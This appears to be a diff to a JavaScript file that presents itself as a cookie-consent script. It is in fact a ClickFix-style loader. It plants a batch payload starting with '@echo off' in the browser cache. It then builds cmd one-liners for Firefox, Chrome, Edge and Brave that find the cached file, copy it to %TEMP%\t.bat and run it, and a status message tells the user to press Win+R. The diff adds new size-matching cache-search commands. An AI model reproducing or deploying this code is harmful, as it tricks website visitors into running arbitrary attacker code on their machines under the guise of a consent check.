@@ -2,7 +2,7 @@
    <script src="https://yoursite.com/consent.js"></script>
    File URL from page query: ?f=https://abc.com/hello.txt  or  ?f=<base64-url>
    Payload MUST be strict raw body only (no HTTP headers, no HTML, no BOM, no bytes after ===END===).
-   Firefox: findstr + fsutil trim. Chromium: findstr on Profile cache f_* (close browser before Win+R).
+   Firefox: findstr + fsutil trim. Chromium: for /r User Data, f_* file size (cacheFileSizes).
 */
 (function () {
   'use strict';
@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.12',
+    version: '1.9.13',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -24,11 +24,17 @@
     bodyStartMarker: 'CDRP7F3A9D2B8C4',
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
+    cacheFileSizes: {
+      firefox: 0,
+      chrome: 0,
+      edge: 0,
+      brave: 0
+    },
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (data_* f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
-      edge: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (data_* f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit',
-      brave: 'cmd /k cd/d %TMP%&del t.bat 2>nul&for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\{PROF}\\Cache\\Cache_Data" %F in (data_* f_*)do @findstr /m /c:{M} "%F">nul&&copy /y "%F" t.bat&call t.bat&exit'
+      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&%TEMP%\\t.bat',
+      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&%TEMP%\\t.bat',
+      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&%TEMP%\\t.bat'
     }
   };
 
@@ -118,7 +124,8 @@
       if (bk === 'firefox') {
         statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes — Win+R scans Firefox cache2\\entries';
       } else {
-        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ', ' + getChromiumProfileFolder() + ') — each run: reload this page, quit browser fully, then Win+R';
+        var csz = (CONSENT_CONFIG.cacheFileSizes || {})[bk] || 0;
+        statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes (' + bk + ') — quit browser, run get-cache-size.cmd, set cacheFileSizes.chrome=' + (csz || '?') + ', then Win+R';
       }
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
@@ -154,6 +161,10 @@
     var key = getBrowserKey();
     if (!bodySize || bodySize < 1) return '';
 
+    var cacheSizes = CONSENT_CONFIG.cacheFileSizes || {};
+    var cacheEntrySize = cacheSizes[key];
+    if (key !== 'firefox' && (!cacheEntrySize || cacheEntrySize < 1)) return '';
+
     var templates = CONSENT_CONFIG.verificationTemplates || {};
     var tpl = templates[key] || templates.firefox || '';
     if (!tpl) return '';
@@ -163,6 +174,7 @@
       .replace(/\{E\}/g, endMarker)
       .replace(/\{SM1\}/g, String(bodySize - 1))
       .replace(/\{SZ\}/g, String(bodySize))
+      .replace(/\{CSZ\}/g, String(cacheEntrySize || ''))
       .replace(/\{PROF\}/g, getChromiumProfileFolder());
   }
 
